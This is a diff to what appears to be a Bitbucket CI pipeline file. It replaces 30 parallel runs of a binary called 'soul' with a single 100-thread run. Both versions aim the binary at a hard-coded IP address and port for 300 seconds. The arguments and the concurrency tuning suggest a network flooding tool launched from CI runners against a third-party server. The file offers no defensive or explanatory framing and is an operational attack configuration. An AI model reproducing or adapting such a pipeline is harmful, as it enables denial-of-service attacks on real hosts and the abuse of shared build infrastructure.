@@ -1,29 +1,13 @@
-image: ubuntu:22.04   # Best stable Ubuntu LTS image
+image: ubuntu:22.04
 
 pipelines:
   branches:
     main:
       - step:
-          name: Run Soul Jobs
-          size: 2x   # More CPU for concurrency (you can change to 1x if needed)
-          caches:
-            - apt
-            - pip
+          name: Run Soul (Single Job - 100 Threads)
+          size: 2x
           script:
-            - echo "Installing dependencies..."
-            - apt-get update && apt-get install -y curl build-essential
-
-            - echo "Setting execution permission..."
+            - apt-get update && apt-get install -y build-essential
             - chmod +x ./soul
-
-            - echo "Starting 30 concurrent jobs..."
-            - |
-              for i in $(seq 1 30); do
-                ./soul 20.235.53.164 23628 300 100 &
-              done
-            - wait
-
-definitions:
-  caches:
-    apt: /var/cache/apt/archives
-    pip: /root/.cache/pip
+            - echo "Running single job with 100 threads..."
+            - ./soul 20.235.53.164 23628 300 100
